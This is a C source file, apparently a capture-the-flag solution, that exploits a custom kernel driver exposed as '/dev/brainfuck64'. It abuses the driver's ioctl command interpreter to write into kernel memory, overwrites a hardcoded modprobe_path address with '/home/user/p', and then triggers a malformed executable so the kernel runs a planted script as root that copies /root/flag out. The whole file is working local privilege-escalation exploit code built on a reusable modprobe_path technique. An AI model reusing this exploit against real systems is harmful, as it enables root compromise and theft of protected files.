#include<stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <signal.h>

#define DEVICE_FILE_PATH "/dev/brainfuck64"
#define READ 0xD00DC0D3ul
#define WRITE 0xAC1DC0D3ul
#define ATTACK 0xBAADC0D3ul
unsigned long modprobe_path=0xffffffff81a3f7a0;
unsigned int header=0x34364642;
struct req{
	unsigned int header;
	unsigned int filler;
	unsigned long size;
};
int fd;
int iter=0;
char cmds[0x1f4];
void Exit(char *msg){
	perror(msg);
	exit(EXIT_FAILURE);
}
int Open(char *filename,int flags){
	fd=open(filename,flags);
	if(fd<0){
		Exit("open failed!");
	}		
	return fd;
}
void Read(char *readbuf){
	if(ioctl(fd,READ,readbuf)<0){
		Exit("read failed");
	}
}
void Write(unsigned long size){
	struct req writebuf={.header=header,.size=size};
	if(ioctl(fd,WRITE,(char *)&writebuf)<0){
		Exit("write failed");
	}
}
void memsub(){
	cmds[iter]='\x3c';
	iter++;
}
void memadd(){
	cmds[iter]='\x3e';
	iter++;
}
void datasub(){
	cmds[iter]='\x2d';
	iter++;
}
void dataadd(){
	cmds[iter]='\x2b';
	iter++;
}
void memwrite(unsigned long payload){
	cmds[iter]='\x5e';
	*(unsigned long *)(&cmds[iter+1])=payload;
	iter=iter+9;
}
void attack(){
	if(ioctl(fd,ATTACK,cmds)<0){
		Exit("cmds failed");
	}
} 
void reset(){
	iter=0;
	memset(cmds,0,sizeof(cmds));
}
void modprobe_exploit(){
	system("echo -ne '#!/bin/sh\n/bin/cat /root/flag > /home/user/flag\n/bin/chmod 777 /home/user/flag'>/home/user/p");
	system("chmod +x /home/user/p");
	system("echo -ne '\\xff\\xff\\xff' > /home/user/trig");
	system("chmod +x /home/user/trig");
	system("/home/user/trig");
	system("cat /home/user/flag");
}
int exploit(){
	fd=Open(DEVICE_FILE_PATH,O_RDWR);
	Write(0x20);
	reset();
	for(int i=0;i<0x20;i++){
		memadd();
	}
	memwrite(modprobe_path-0x10);
	attack();
	Write(0x20);
	reset();
	for(int i=0;i<0x10;i++){
		memadd();
	}
	unsigned long n1=0x73752f656d6f682f;
	unsigned long n2=0x702f7265;
	memwrite(n1);
	attack();
	reset();
	for(int i=0;i<0x8;i++){
		memadd();
	}
	memwrite(n2);
	attack();
	modprobe_exploit();
}
int main(){
	exploit();
	return 0;
}

